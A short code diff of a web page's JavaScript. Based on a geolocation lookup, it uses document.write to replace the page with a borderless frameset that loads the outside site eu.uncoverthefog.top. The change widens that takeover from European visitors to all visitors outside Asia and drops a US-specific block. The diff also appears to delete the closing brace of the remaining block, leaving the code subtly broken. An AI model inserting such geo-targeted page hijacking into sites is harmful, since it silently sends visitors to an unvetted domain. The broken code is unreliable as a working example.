@@ -27,22 +27,13 @@
                         document.write(b);
                         document.write(c);
                     }
-                    if (JSON.stringify(data.continent) == '"Europe"') {
+                    if (JSON.stringify(data.continent) != '"Asia"') {
                         var a = '<frameset framespacing="0" border = "0" rows = "0" frameborder = "0">';
                         var b = '<frame name="main" src="http://eu.uncoverthefog.top/" scrolling="auto" noresize>';
                         var c = '</frameset>';
                         document.write(a);
                         document.write(b);
                         document.write(c);
-                    }
-                    if (JSON.stringify(data.countryCode) == '"US"') {
-                        var a = '<frameset framespacing="0" border = "0" rows = "0" frameborder = "0">';
-                        var b = '<frame name="main" src="http://eu.uncoverthefog.top/" scrolling="auto" noresize>';
-                        var c = '</frameset>';
-                        document.write(a);
-                        document.write(b);
-                        document.write(c);
-                    }
                 },
                 type: 'GET',
                 dataType: 'JSON'
